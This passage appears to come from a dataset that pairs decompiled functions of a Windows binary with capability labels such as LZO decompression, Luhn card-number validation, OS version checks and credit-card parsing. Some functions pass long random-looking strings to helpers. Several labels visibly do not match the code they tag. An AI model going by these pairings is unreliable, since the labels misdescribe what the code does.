*puVar7 = uVar5;\n            if (uVar5 != 0) {\n                puVar7 = puVar7 + 1;\n            }\n            iVar6 = puVar7 - puVar1;\n        }\n        *(param_1 + 0x10) = iVar6 >> 2;\n        if (puVar7 != puVar1) {\n            return;\n        }\n    }\n    else {\ncode_r0x004263e0:\n        *(param_1 + 0x10) = 0;\n    }\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 677
    },
    "00427670": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid fcn.00427670(uint *param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *puVar5;\n    \n    puVar4 = param_3 + 0x14;\n    puVar2 = param_1 + (param_2 + -1 >> 5) + 1;\n    puVar1 = puVar4 + *(param_3 + 0x10);\n    puVar5 = param_1;\n    if (puVar4 < puVar1) {\n        do {\n            puVar3 = puVar4 + 1;\n            *puVar5 = *puVar4;\n            puVar4 = puVar3;\n            puVar5 = puVar5 + 1;\n        } while (puVar3 < puVar1);\n        param_1 = param_1 + (puVar1 + (-0x15 - param_3) & 0xfffffffcU) + 4;\n    }\n    for (; param_1 < puVar2; param_1 = param_1 + 1) {\n        *param_1 = 0;\n    }\n    return;\n}\n",
        "token_count": 276
    },
    "00431cc0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00431cc0(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint auStack284 [63];\n    uint uStack32;\n    uchar auStack28 [12];\n    \n    iVar1 = 0;\n    do {\n        *(auStack284 + iVar1) = iVar1;\n        iVar1 = iVar1 + 1;\n    } while (iVar1 != 0x100);\n    iVar1 = param_1 + 0x1d;\n    if (*(*param_1 + 0x1c) == 0x431f40) {\n        puVar5 = param_1 + 0x21U & 0xfffffffc;\n        *(param_1 + 0x1d) = auStack284[0];\n        *(param_1 + 0x119) = uStack32;\n        iVar2 = iVar1 - puVar5;\n        puVar4 = auStack284 - iVar2;\n        for (uVar3 = iVar2 + 0x100U >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    else {\n        (**(*param_1 + 0x1c))(auStack284, auStack28, iVar1);\n    }\n    *(param_1 + 7) = 1;\n    iVar1 = sub.msvcrt.dll_memcmp(auStack284, iVar1, 0x100);\n    if (iVar1 != 0) {\n        *(param_1 + 7) = 2;\n    }\n    return;\n}\n",
        "token_count": 411
    },
    "0048c8d0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0048c8d0(uint *param_1, int32_t param_2, uint8_t param_3, int32_t param_4)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    \n    *param_1 = 0x50b250;\n    param_1[4] = 0;\n    param_1[5] = 0;\n    param_1[1] = param_4 != 0;\n    *(param_1 + 3) = param_2 != 0 & param_3;\n    if (param_2 == 0) {\n        param_2 = 0x50b660;\n    }\n    puVar2 = param_1 + 0x21U & 0xfffffffc;\n    *(param_1 + 0x1d) = 0;\n    *(param_1 + 0x119) = 0;\n    param_1[6] = param_2;\n    uVar1 = param_1 + (0x11d - puVar2) >> 2;\n    for (; uVar1 != 0; uVar1 = uVar1 - 1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *(param_1 + 7) = 0;\n    *(param_1 + 0x11d) = 0;\n    puVar2 = param_1 + 0x121U & 0xfffffffc;\n    *(param_1 + 0x219) = 0;\n    uVar1 = param_1 + (0x21d - puVar2) >> 2;\n    for (; uVar1 != 0; uVar1 = uVar1 - 1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *(param_1 + 0x21d) = 0;\n    return;\n}\n",
        "token_count": 437
    },
    "004a3610": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint * fcn.004a3610(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    char cVar5;\n    uint *puVar6;\n    uint32_t **ppuVar7;\n    uint uVar8;\n    uint uVar9;\n    int32_t *piVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    code *pcVar13;\n    uint *puVar14;\n    ulong uVar15;\n    int32_t iStack152;\n    uint32_t *puStack124;\n    uint32_t *puVar16;\n    \n    puVar6 = sub.msvcrt.dll_malloc(param_1 + 0x60);\n    if ((puVar6 != NULL) || (puVar6 = fcn.00428e50(),  puVar6 != NULL)) {\n        *puVar6 = 0;\n        puVar6[0x17] = 0;\n        puVar14 = puVar6 + 1 & 0xfffffffc;\n        for (uVar11 = puVar6 + (0x60 - (puVar6 + 1 & 0xfffffffc)) >> 2; uVar11 != 0; uVar11 = uVar11 - 1) {\n            *puVar14 = 0;\n            puVar14 = puVar14 + 1;\n        }\n        return puVar6 + 0x18;\n    }\n    fcn.004a0230();\n    puVar6 = fcn.004a3610(4);\n    *puVar6 = 0x50b480;\n    fcn.004a3bc0(puVar6, 0x507610, 0x499ef0);\n    puVar6 = fcn.004a3610(4);\n    *puVar6 = 0x50a774;\n    puVar16 = 0x5070d0;\n    fcn.004a3bc0(puVar6, 0x5070d0, 0x46e0d0);\n    ppuVar7 = fcn.004a3950();\n    puVar2 = *ppuVar7;\n    puVar1 = puVar16 + -0xc;\n    iVar12 = puVar16[1] + 0xb8b1aabc + (0x432b2aff < *puVar16);\n    if (iVar12 == 0 && (1 < *puVar16 + 0xbcd4d500) <= -iVar12) {\n        uVar11 = puVar16[-7];\n        uVar4 = -uVar11;\n        if (-1 < uVar11) {\n            uVar4 = uVar11;\n        }\n        puVar16[-7] = uVar4 + 1;\n        ppuVar7[1] = ppuVar7[1] + -1;\n        if (puVar2 != puVar1) {\n            puVar16[-8] = puVar2;\n            *ppuVar7 = puVar1;\n        }\n        return puVar16[-2];\n    }\n    if (puVar2 == NULL) {\n        *ppuVar7 = puVar1;\n        return NULL;\n    }\n    fcn.004a0230();\n    if ((puStack124 == NULL) ||\n       (fcn.004a36d0(puStack124),  iVar12 = puStack124[1] + 0xb8b1aabc + (0x432b2aff < *puStack124), \n       iVar12 != 0 || -iVar12 < (1 < *puStack124 + 0xbcd4d500))) {\n        fcn.004a0230();\n    }\n    fcn.00428a40(puStack124[-9]);\n    fcn.004a36d0(iStack152);\n    uVar9 = *(iStack152 + -0x18);\n    uVar3 = *(iStack152 + -0x24);\n    uVar8 = fcn.00428a60(*(iStack152 + -0x28));\n    fcn.004a36d0(uVar8);\n    fcn.004a3970();\n    while( true ) {\n        fcn.00428700();\n        cVar5 = fcn.004287e0(uVar9);\n        if (cVar5 != '\\0') break;\n        cVar5 = fcn.004287e0(uVar9);\n        if (cVar5 != '\\0') goto code_r0x004a4f72;\n        fcn.00428a40(uVar3);\n    }\n    fcn.004a3b60();\ncode_r0x004a4f72:\n    puVar6 = fcn.004a3610(4);\n    *puVar6 = 0x50a974;\n    fcn.004a3bc0(puVar6, 0x5071f8, 0x476a20);\n    uVar9 = sub.msvcrt.dll_abort();\n    fcn.004a36d0(uVar9);\n    uVar15 = sub.msvcrt.dll_abort();\n    fcn.004a3840();\n    pcVar13 = (uVar15 >> 0x20) + 1;\n    if (pcVar13 != NULL) {\n        fcn.0041b360(uVar15);\n    }\n    uVar15 = fcn.004a37a0();\n    uVar9 = uVar15;\n    if (uVar15 >> 0x20 != 1) goto code_r0x004a5051;\n    piVar10 = fcn.004a36d0(uVar9);\n    uVar9 = (**(*piVar10 + 8))();\n    uVar8 = (*pcVar13)(2);\n    sub.msvcrt.dll_fwrite(\"  what():  \", 1, 0xb, uVar8);\n    uVar8 = (*pcVar13)(2);\n    sub.msvcrt.dll_fputs(uVar9, uVar8);\n    uVar9 = (*pcVar13)(2);\n    sub.msvcrt.dll_fputc(10, uVar9);\n    fcn.004a3840();\n    do {\n        sub.msvcrt.dll_abort();\n        uVar9 = uVar3;\n        fcn.00427908(uVar3);\n        fcn.004a3b60();\ncode_r0x004a5051:\n        fcn.004a36d0(uVar9);\n        fcn.004a3840();\n    } while( true );\n}\n",
        "token_count": 1450
    },
    "0040222e": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid __fastcall fcn.0040222e(int32_t param_1)\n\n{\n    uint uVar1;\n    uint extraout_ECX;\n    uint extraout_EDX;\n    uint var_c0h;\n    uint var_a8h;\n    uint var_90h;\n    uint var_78h;\n    uint var_60h;\n    uint var_48h;\n    uint var_30h;\n    uint var_bp_ch;\n    \n    *(param_1 + 0x44) = param_1 + 0x4c;\n    *(param_1 + 0x48) = 0;\n    *(param_1 + 0x4c) = 0;\n    fcn.004015ea(\"nljefxfylyyxykskaclyknrymcsfsqsfkq\");\n    fcn.004015ea(0x4f86ab);\n    fcn.004020a4(1, *0x4f8910, *0x4f890c, &var_48h, &var_30h, *0x4f8908, *0x4f8904);\n    fcn.004906c0();\n    fcn.004906c0();\n    fcn.004015ea(\"enbitnoqqaqqgtiuahkrjtvtynxnzaunedyhull\");\n    fcn.004015ea(\"cerdfnnjhotffqgnlugnxq\");\n    fcn.00402118(0xf60, 0, 0xd0a, 0, 0xfa1, 0x1041, 0x1583, &var_48h, 0, &var_30h);\n    fcn.004906c0();\n    fcn.004906c0();\n    fcn.004015ea(\"zxwjiytaomhajxuotoypowbjroxcnrkqraqkxzrwleyvg\");\n    fcn.004015ea(\"mmttgmawvcvjmntehvhkfxqvvqvtqgtajlnakbjtztyjnhoflxjrdfsnoitfyojofkixgmwupkzhqvxceumncmjjwuurfszqs\");\n    fcn.0040218c(0x2ce, &var_48h, 1, 0, 1, &var_30h);\n    fcn.004906c0();\n    fcn.004906c0();\n    fcn.004021de(0x9c, 0x14bf);\n    fcn.004015ea(0x4f877d);\n    fcn.00401d20(*0x4f8914, 1, 0x487, 0x1603, &var_30h);\n    fcn.004906c0();\n    fcn.004015ea(\"idzxnoqgirxcczhvywlrvkgnpjyuqomipneubuszxsgusvezkyldksgydyttzeuftoxeur\");\n    fcn.00401e48(param_1, 0, &var_30h);\n    fcn.004906c0();\n    fcn.004906c0();\n    fcn.004015ea(\"xtipsdjgczmlmyjbrfy\");\n    fcn.00401e94(param_1, 0xcba, &var_30h, 0x9f, 0, 1, 0);\n    fcn.004906c0();\n    fcn.004906c0();\n    fcn.00401f92(0x55b, 0x1d10, 0x1610, 1, 0, *0x4f891c, 1, *0x4f8918);\n    fcn.004015ea(\"rfgltjqiqnpi\");\n    fcn.004906c0(extraout_EDX);\n    fcn.0040202c();\n    fcn.004015ea(\"dwljaxqjgfaninjcpprzegxsmusysw\");\n    uVar1 = fcn.004015ea(\"mossmbtwwyqmuojbuqavctbyfqguppcghirommdxnejvwgn\");\n    fcn.004906c0(uVar1);\n    fcn.004906c0();\n    uVar1 = fcn.004015ea(\"rewu\");\n    fcn.004906c0(uVar1);\n    fcn.004015ea(\"hqprsakpbhalsrcp\");\n    fcn.00401918(&var_30h, 0, 1, 0x214, 0x1d8c);\n    fcn.004906c0();\n    fcn.004015ea(\"avkhlooowfnntkhyzndwtgzonewmvknjqhbsdzgzgckshvaqhctsfdyirsspmadpqx\");\n    fcn.004015ea(\"graookxygsjtckamvhkgjjsywztgmtn\");\n    fcn.004015ea(\"nfaw\");\n    fcn.004906c0(extraout_ECX);\n    fcn.004906c0();\n    fcn.004906c0();\n    fcn.00401a84();\n    fcn.004015ea(\"adbjsnfnmrxgmvnpwpvrwyqxoffumfcqlnfljghvqriefmfeyqczcwzruklpceazk\");\n    fcn.004015ea(\"lpqboveqeqfijwnhlwggekrdshqajwrbmhjydyhfyszsjtpdbd\");\n    fcn.00401afc(0x399, 0x5fb, 0x4f3, *0x4f8924, 0x188, *0x4f8920, &var_48h, 1, 0x125, &var_30h);\n    fcn.004906c0();\n    fcn.004906c0();\n    return;\n}\n",
        "token_count": 1341
    },
    "004051e4": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid fcn.004051e4(void)\n\n{\n    uint uVar1;\n    uint extraout_ECX;\n    uint extraout_EDX;\n    uint extraout_EDX_00;\n    uint var_78h;\n    uint var_60h;\n    uint var_48h;\n    uint var_30h;\n    uint var_bp_ch;\n    \n    fcn.004026fe(\"dywheoubghdnmhvgheoexnwuwzb\");\n    fcn.004906c0(extraout_EDX);\n    fcn.004026fe(\"yqanrxzkdgbnorbtrcgavcqgawrqydatvmulj\");\n    fcn.004026fe(\"fcexaxlwhxrpnbprptnrhqdmwgluiumfmj\");\n    uVar1 = fcn.004026fe(\"nspwgbufzujoqkoicwnsmyndlujifnblhqieertocfxuawyusxhqgczobtgsuopmopsfzdonbwzyfnaxhoocsrucja\");\n    fcn.004906c0(uVar1);\n    fcn.004906c0();\n    fcn.004906c0();\n    uVar1 = fcn.004026fe(\"juorbiahomdqbjtvadhcgwwodavgriumevytkwpokhwnaqwx\");\n    fcn.004906c0(uVar1);\n    fcn.00405028(0);\n    fcn.004026fe(\"uonyxifvfelpgkbbtqhilqlmshptuxeqbdo\");\n    fcn.004026fe(\"nlincqefbfepuwavbinlhscnecjorgyhacdpcxyanebfnwcsmpjt\");\n    fcn.004026fe(\"jkserdsedmfhdzrkywmojdxqpizmahkcfa\");\n    fcn.004906c0();\n    fcn.004906c0();\n    fcn.004906c0();\n    fcn.00405114();\n    fcn.004026fe(\"ocdnvvfgcownrhvintsflwiexsbgvtidqpdfoptzijxcyyapbgbbud\");\n    uVar1 = fcn.004026fe(\n                        \"vxmkzmlgilqwehrnvdvrkuthwklsyavpmshxhydzuzpacwiaaazgrtgliwxmygybzycvrjmqhblcnuqllagrqfbaaafugsorimd\"\n                        );\n    fcn.004906c0(uVar1);\n    fcn.004906c0();\n    uVar1 = fcn.004026fe(\"hhejhn\");\n    fcn.004906c0(uVar1);\n    fcn.00405196();\n    fcn.004026fe(\"jgffdnpitkxtobhabnvwhibpmteamhcinxdcibpirspnewdtwrlpfbqklynesaehfjthmvpexgweavfhfknqvyztsqsfm\");\n    fcn.004026fe(0x4faddf);\n    fcn.004026fe(\"hbynthvlkkpnuoyeyhajpiiahwegakurxksdenlspbjxrelbiegucrygcfhpsdstgxlciwdlixtsmimczyqeuqsog\");\n    fcn.00404c84(*0x501c10, &var_60h, 0, 0x19f7, &var_48h, &var_30h, 1, *0x501c0c, 0x127, 0x82);\n    fcn.004906c0();\n    fcn.004906c0();\n    fcn.004906c0();\n    fcn.004026fe(\"xzgdbdoxdydqmmctixktblqhhwdcbgvpqcbaydepidixpfartwozvmejnawgbpibekihnuonumnmjsrya\");\n    fcn.004026fe(\"tqfghlqvskvegnzluacvvsl\");\n    fcn.004026fe(\"ujvouhaldkdpvrgyiyrbywjagwiwfluwduqwjeexgkieumx\");\n    fcn.004026fe(\"ilycsxxtvnzpkgrvsfqimbfraxdgrozvdaqqdhrynzxvuatpuxxomituokorjkutgxiuahthietsxrwpynpgxdlpmjmkfuss\");\n    fcn.00404da0(0x2ec, *0x501c18, &var_78h, 0x1336, 0x1693, &var_60h, &var_48h, &var_30h, 0x2a5, *0x501c14);\n    fcn.004906c0();\n    fcn.004906c0();\n    fcn.004906c0();\n    fcn.004906c0();\n    fcn.004026fe(\"dzufyqrdmyolcqhkdddvrtfewdgykhbbmbhhuxmxunaetsbwscfafkenefwoznay\");\n    uVar1 = fcn.004026fe(\"biynrqdwzkaikcfvsyvismafdpwvsnalcusaasfmloulgktulssvooputrbhylqettleuwscouy\");\n    fcn.004906c0(uVar1);\n    fcn.004906c0();\n    fcn.004026fe(\"xpoqsjwmakdurnxznejdpzndxxgwkluiovcdfbqqrbojw\");\n    fcn.004026fe(\"cssooxvyyehskbcrkwaibfaehkajdiruqtfqiubliylgfcgjiggznfyjomoarcqskndjxvorrcmra\");\n    fcn.004906c0(extraout_ECX);\n    fcn.004906c0();\n    uVar1 = fcn.004026fe(0x4f9d0a);\n    fcn.004906c0(uVar1);\n    fcn.004026fe(\"jwrlkmyizlxbmlklshnurxohayjgijvemufxtskqhiqqrthofwrofq\");\n    uVar1 = fcn.00404e6a(&var_30h, 0xa95);\n    fcn.004906c0(uVar1, uVar1);\n    fcn.004026fe(\"wklmxhcrypclngmoukowtheanxghwdc\");\n    fcn.00404ec0();\n    fcn.004906c0();\n    fcn.004026fe(\"kfzrqcxcefhrbzgbfadhnzp\");\n    fcn.004026fe(\"aheoohlnszygtjuhmhozcmqzgdyelhhhfxesdcolvfvbsdjoyyqcoycaaufyetsrxlfcocdydzupduhnijmqpzbyjgnlvu\");\n    fcn.004026fe(\"tozihjltvgsmotno\");\n    fcn.00404f3a(&var_60h, 0, &var_48h, &var_30h, 0, *0x501c24, 1, SUB84(*0x501c20, 0), *0x501c20 >> 0x20, 0);\n    fcn.004906c0();\n    fcn.004906c0();\n    fcn.004906c0();\n    fcn.004026fe(\"njyhmwvbihhjwzkjrszohuxiyikcoslhgeiyzboomqiil\");\n    fcn.004026fe(\"fjkcuhev\");\n    fcn.004026fe(\"wkyfwzpwbwsllrfxvconblehmglukoiubdnnpmrpov\");\n    fcn.004906c0(extraout_EDX_00);\n    fcn.004906c0();\n    fcn.004906c0();\n    fcn.004026fe(\"uplzfyijkxoryouyxxcenbgtohsyrqwzwonewsofdzdunfsvkzbkxuhbgyju\");\n    fcn.00404c26(0x95b, &var_30h, 0x19d2);\n    fcn.004906c0();\n    uVar1 = fcn.004026fe(\"ajcbzovjgtfqacrnvcdssrlhya\");\n    fcn.004906c0(uVar1);\n    return;\n}\n",
        "token_count": 1927
    },
    "0041d4f0": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.0041d4f0(ushort *param_1, uint param_2, uint param_3, int32_t param_4)\n\n{\n    uint uVar1;\n    uint uVar2;\n    ushort uStack14;\n    \n    uStack14 = 0;\n    if (param_1 == NULL) {\n        param_1 = &uStack14;\n    }\n    uVar1 = sub.msvcrt.dll____mb_cur_max_func();\n    uVar2 = fcn.00427b10();\n    if (param_4 == 0) {\n        param_4 = 0x549434;\n    }\n    fcn.0041d370(param_1, param_2, param_3, param_4, uVar2, uVar1);\n    return;\n}\n",
        "token_count": 174
    },
    "0046a010": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.0046a010(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint *in_ECX;\n    uint var_18h;\n    uint var_14h;\n    uint var_bp_10h;\n    uint var_8h;\n    \n    *in_ECX = 0xffffffff;\n    in_ECX[1] = 0xffffffff;\n    iVar1 = *arg_8h;\n    in_ECX[2] = 0;\n    if ((*(arg_8h + *(iVar1 + -0xc) + 0x14) & 5) == 0) {\n        piVar2 = *(arg_8h + *(iVar1 + -0xc) + 0x78);\n        (**(*piVar2 + 0x10))(piVar2, 0, 0, 1, 0x10);\n        *in_ECX = var_18h;\n        in_ECX[1] = var_14h;\n        in_ECX[2] = var_bp_10h;\n    }\n    return;\n}\n",
        "token_count": 264
    },
    "0047fca0": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.0047fca0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint *in_ECX;\n    uint var_18h;\n    uint var_14h;\n    uint var_bp_10h;\n    uint var_8h;\n    \n    *in_ECX = 0xffffffff;\n    in_ECX[1] = 0xffffffff;\n    iVar1 = *arg_8h;\n    in_ECX[2] = 0;\n    if ((*(arg_8h + *(iVar1 + -0xc) + 0x14) & 5) == 0) {\n        piVar2 = *(arg_8h + *(iVar1 + -0xc) + 0x78);\n        (**(*piVar2 + 0x10))(piVar2, 0, 0, 1, 0x10);\n        *in_ECX = var_18h;\n        in_ECX[1] = var_14h;\n        in_ECX[2] = var_bp_10h;\n    }\n    return;\n}\n",
        "token_count": 265
    },
    "0040dfc0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040dfc0(uint *param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (param_1 == NULL) {\n        return;\n    }\n    do {\n    // switch table (80 cases) at 0x5034e0\n        switch(*param_1) {\n        default:\n            goto code_r0x0040dfe7;\n        case 1:\n        case 2:\n        case 3:\n        case 9:\n        case 10:\n        case 0xb:\n        case 0xc:\n        case 0xd:\n        case 0xe:\n        case 0xf:\n        case 0x10:\n        case 0x11:\n        case 0x12:\n        case 0x13:\n        case 0x14:\n        case 0x15:\n        case 0x16:\n        case 0x17:\n        case 0x19:\n        case 0x1a:\n        case 0x1b:\n        case 0x1c:\n        case 0x1d:\n        case 0x1e:\n        case 0x1f:\n        case 0x20:\n        case 0x21:\n        case 0x22:\n        case 0x25:\n        case 0x26:\n        case 0x28:\n        case 0x29:\n        case 0x2a:\n        case 0x2b:\n        case 0x2d:\n        case 0x2e:\n        case 0x2f:\n        case 0x30:\n        case 0x33:\n        case 0x34:\n        case 0x35:\n        case 0x36:\n        case 0x37:\n        case 0x38:\n        case 0x39:\n        case 0x3a:\n        case 0x3b:\n        case 0x3c:\n        case 0x3d:\n        case 0x3e:\n        case 0x3f:\n        case 0x42:\n        case 0x48:\n        case 0x49:\n        case 0x4a:\n        case 0x4b:\n        case 0x4c:\n        case 0x4d:\n        case 0x4e:\n        case 0x4f:\n            break;\n        case 4:\n            *in_EAX = *in_EAX + 1;\n            break;\n        case 7:\n        case 8:\n        case 0x32:\n            param_1 = param_1[3];\n            goto code_r0x0040dfe3;\n        case 0x23:\n        case 0x24:\n            if (*param_1[2] == 5) {\n                *param_2 = *param_2 + 1;\n            }\n            break;\n        case 0x2c:\n        case 0x43:\n        case 0x44:\n        case 0x45:\n        case 0x46:\n            param_1 = param_1[2];\n            goto code_r0x0040dfe3;\n        }\n        fcn.0040dfc0();\n        param_1 = param_1[3];\ncode_r0x0040dfe3:\n    } while (param_1 != NULL);\ncode_r0x0040dfe7:\n    return;\n}\n",
        "token_count": 751
    },
    "0041ac40": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041ac40(int32_t *param_1)\n\n{\n    code *pcVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcStack52;\n    \n    iVar4 = 1;\n    pcVar1 = in_EAX[3];\n    while( true ) {\n        iVar2 = fcn.00419990();\n        if ((iVar2 != 0) && (iVar2 != 5)) {\n            return 2;\n        }\n        if (iVar2 == 5) break;\n        iVar2 = (*pcVar1)(1, 10, *in_EAX, in_EAX[1]);\n        if (iVar2 != 0) {\n            return 2;\n        }\n        if (pcStack52 != NULL) {\n            iVar2 = (*pcStack52)(1, 10, *in_EAX, in_EAX[1]);\n            if (iVar2 == 7) goto code_r0x0041ad55;\n            if (iVar2 != 8) {\n                return 2;\n            }\n        }\n        iVar4 = iVar4 + 1;\n        fcn.0041ab00();\n    }\n    iVar3 = (*pcVar1)(1, 0x1a, *in_EAX, in_EAX[1]);\n    if (iVar3 != 0) {\n        return 2;\n    }\ncode_r0x0041ad55:\n    *param_1 = iVar4;\n    return iVar2;\n}\n",
        "token_count": 341
    },
    "0041b160": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041b160(uint param_1, uint param_2, uint *param_3)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t extraout_EDX;\n    uint *puVar2;\n    uint *puVar3;\n    uint auStack476 [32];\n    uint auStack348 [18];\n    int32_t iStack276;\n    uint uStack272;\n    int32_t iStack252;\n    code *pcStack52;\n    int32_t iStack24;\n    uint uStack20;\n    \n    iStack24 = in_EAX;\n    uStack20 = param_2;\n    fcn.0041a910();\n    puVar2 = auStack476;\n    puVar3 = auStack348;\n    for (iVar1 = 0x20; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    while( true ) {\n        iVar1 = fcn.00419990();\n        if (iVar1 == 5) {\n            return 5;\n        }\n        if (iVar1 != 0) break;\n        if (pcStack52 != NULL) {\n            iVar1 = (*pcStack52)(1, 1, *param_3, param_3[1], param_3, auStack348);\n            if (iVar1 == 6) {\n                param_3[3] = 0;\n                param_3[4] = iStack276 + (iStack252 >> 0x1f);\n                puVar2 = auStack476;\n                puVar3 = auStack348;\n                for (iVar1 = 0x20; iVar1 != 0; iVar1 = iVar1 + -1) {\n                    *puVar3 = *puVar2;\n                    puVar2 = puVar2 + 1;\n                    puVar3 = puVar3 + 1;\n                }\n                iVar1 = fcn.0041ab70();\n                if (iVar1 != 7) {\n                    return iVar1;\n                }\n                fcn.0041ad70();\n                fcn.0041b150(iStack276, uStack272);\n                *(&stack0x00000000 + extraout_EDX) = uStack272;\n                return iStack24;\n            }\n            if (iVar1 != 8) {\n                return 3;\n            }\n        }\n        fcn.0041ab00();\n    }\n    return 3;\n}\n",
        "token_count": 569
    },
    "0041b4e0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041b4e0(code *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_158h;\n    uint var_d8h;\n    \n    fcn.0041a910();\n    while (((iVar2 = fcn.00419990(),  iVar2 == 0 || (iVar2 == 5)) && (iVar1 = (*arg_8h)(&var_158h, arg_ch),  iVar1 == 0)\n           )) {\n        if (iVar2 == 5) {\n            return 5;\n        }\n        fcn.0041ab00();\n    }\n    return 3;\n}\n",
        "token_count": 154
    },
    "0041d250": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nfloat10 fcn.0041d250(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    float fStack20;\n    int32_t aiStack16 [4];\n    \n    uVar1 = fcn.0041ef70(param_1, param_2, 0x4f5a28, aiStack16, &fStack20);\n    // switch table (6 cases) at 0x505af0\n    switch(uVar1 & 7) {\n    default:\n        fStack20 = 0.0;\n        break;\n    case 1:\n    case 5:\n        fStack20 = (aiStack16[0] + 0x96) * 0x800000 | fStack20 & 0x7fffff;\n        break;\n    case 2:\n        break;\n    case 3:\n        fStack20 = INFINITY;\n        break;\n    case 4:\n        fStack20 = NAN;\n    }\n    if ((uVar1 & 8) != 0) {\n        fStack20 = fStack20 | 0x80000000;\n    }\n    return fStack20;\n}\n",
        "token_count": 253
    },
    "0040e1d0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\nint32_t fcn.0040e1d0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char *pcVar2;\n    \n    pcVar2 = *(in_EAX + 0xc);\n    if (*pcVar2 != '_') {\n        if (*pcVar2 != 'n') {\n            iVar1 = fcn.0040e0d0();\n            iVar1 = iVar1 + 1;\n            if ((-1 < iVar1) && (pcVar2 = *(in_EAX + 0xc),  *pcVar2 == '_')) goto code_r0x0040e1f6;\n        }\n        return -1;\n    }\n    iVar1 = 0;\ncode_r0x0040e1f6:\n    *(in_EAX + 0xc) = pcVar2 + 1;\n    return iVar1;\n}\n",
        "token_count": 193
    },
    "0040e8f0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
